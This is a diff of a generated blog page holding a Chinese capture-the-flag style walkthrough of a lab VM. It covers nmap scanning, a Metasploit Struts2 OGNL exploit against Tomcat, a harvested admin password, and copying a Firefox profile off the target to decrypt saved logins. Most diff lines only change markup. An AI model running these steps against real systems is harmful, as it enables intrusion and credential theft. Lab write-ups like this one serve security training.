@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -279,8 +279,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -sP 192.168.150.128/24
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sP 192.168.150.128/24
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>获得靶机地址<code>192.168.150.129</code></p>
 <p>然后进行端口扫描获得服务信息：</p>
@@ -289,8 +289,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate <span class="m">10000</span> -T4 -A 192.168.150.129
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap --min-rate <span class="m">10000</span> -T4 -A 192.168.150.129
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫描结果</p>
 <div class="highlight"><div class="chroma">
@@ -307,17 +307,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-<span class="p">|</span> ssh-hostkey: 
-<span class="p">|</span>   <span class="m">2048</span> 19:45:ec:5c:59:46:c8:26:b5:a3:30:d9:2f:79:ac:85 <span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span>   <span class="m">256</span> 18:d1:aa:64:f7:f3:6f:8c:91:82:09:57:0f:07:d2:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_  <span class="m">256</span> 8e:50:a9:c7:1b:23:e2:68:56:0f:fa:59:2a:0a:e0:3e <span class="o">(</span>ED25519<span class="o">)</span>
-8080/tcp open  http    Apache Tomcat 9.0.40
-<span class="p">|</span>_http-favicon: Apache Tomcat
-<span class="p">|</span>_http-title: Apache Tomcat/9.0.40
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 19:45:ec:5c:59:46:c8:26:b5:a3:30:d9:2f:79:ac:85 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 18:d1:aa:64:f7:f3:6f:8c:91:82:09:57:0f:07:d2:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 8e:50:a9:c7:1b:23:e2:68:56:0f:fa:59:2a:0a:e0:3e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8080/tcp open  http    Apache Tomcat 9.0.40
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Apache Tomcat
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache Tomcat/9.0.40
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>扫到靶机开启了22和8080端口，分别是ssh和web服务，且web服务使用了Tomcat中间件。</p>
 <h2 id="渗透过程"><a href="#渗透过程" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:渗透过程" class="headings">渗透过程</a></h2>
@@ -337,13 +337,13 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">use exploit/multi/http/struts2_content_type_ognl
-show options <span class="c1"># 查看配置</span>
-<span class="nb">set</span> RHOSTS 192.168.150.129 <span class="c1"># 设置靶机地址</span>
-<span class="nb">set</span> RPORT <span class="m">8080</span>             <span class="c1"># 设置靶机端口</span>
-<span class="nb">set</span> TARGETURI /struts2-showcase/showcase.action <span class="c1"># 设置action文件地址</span>
-run
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use exploit/multi/http/struts2_content_type_ognl
+</span></span><span class="line"><span class="cl">show options <span class="c1"># 查看配置</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RHOSTS 192.168.150.129 <span class="c1"># 设置靶机地址</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> RPORT <span class="m">8080</span>             <span class="c1"># 设置靶机端口</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> TARGETURI /struts2-showcase/showcase.action <span class="c1"># 设置action文件地址</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>利用成功。读取根目录user.txt</p>
 <pre tabindex="0"><code>Try your best, you have passed the first challenge, and the last one is for you, root me!
@@ -354,8 +354,8 @@ run
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">&#34;admin&#34;</span> <span class="na">password=</span><span class="s">&#34;6mzf3&gt;gfZ.pN8_Mp&#34;</span> <span class="na">roles=</span><span class="s">&#34;manager-gui&#34;</span><span class="nt">/&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">&#34;admin&#34;</span> <span class="na">password=</span><span class="s">&#34;6mzf3&gt;gfZ.pN8_Mp&#34;</span> <span class="na">roles=</span><span class="s">&#34;manager-gui&#34;</span><span class="nt">/&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>登录tomcat管理员，管理员拥有删除目录和上传war包添加目录等权限。</p>
 <p>这里可以很自然的想到上传文件getshell，之所以还要getshell是因为meterpreter无法支持某些命令(如sudo、python)，我们还需要一个完整的shell执行sudo或执行其他命令从而读取<code>/root</code>下的文件。</p>
@@ -386,11 +386,11 @@ run
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 靶机</span>
-python3 -m http.server <span class="m">8090</span> <span class="c1"># 在8090开启web服务</span>
-<span class="c1"># 攻击机</span>
-wget -r 192.168.150.129:8090/ <span class="c1"># 下载靶机firefox目录文件</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 靶机</span>
+</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">8090</span> <span class="c1"># 在8090开启web服务</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 攻击机</span>
+</span></span><span class="line"><span class="cl">wget -r 192.168.150.129:8090/ <span class="c1"># 下载靶机firefox目录文件</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>2、使用firefox_decrypt解密</p>
 <div class="highlight"><div class="chroma">
@@ -398,8 +398,8 @@ wget -r 192.168.150.129:8090/ <span class="c1"># 下载靶机firefox目录文件
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 firefox_decrypt-master/firefox_decrypt.py 192.168.150.129:8090/
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 firefox_decrypt-master/firefox_decrypt.py 192.168.150.129:8090/
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>获得密码<code>skysayohyeah</code></p>
 </blockquote>
